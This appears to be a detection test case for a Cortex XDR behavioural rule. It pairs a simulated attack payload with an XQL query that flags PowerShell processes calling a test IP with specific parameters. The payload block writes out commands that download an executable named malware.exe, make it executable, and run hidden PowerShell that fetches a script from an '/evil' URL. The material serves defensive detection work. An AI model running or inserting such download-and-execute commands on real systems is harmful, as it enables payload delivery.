identity.description: An attacker uses PowerShell to download a payload via HTTP with suspicious parameters, which triggers the 'Suspicious HTTP parameters detected' alert. Cortex should detect the PowerShell process with suspicious command-line parameters and network activity to a test IP.

payload.code:
mkdir -p /tmp/scratch
wget -O /tmp/scratch/malware.exe https://example.com/payload.exe
chmod +x /tmp/scratch/malware.exe
powershell.exe -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'http://192.0.2.10:8080/evil?param=123&cmd=run' -OutFile 'C:\temp\script.ps1'"

biocs.name: PowerShell with Suspicious HTTP Parameters
biocs.description: PowerShell process started with command-line parameters indicating suspicious HTTP request
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'powershell.exe'
| filter action_command_line contains '192.0.2.10'
| filter action_command_line contains 'param=123'
| filter action_command_line contains 'cmd=run'
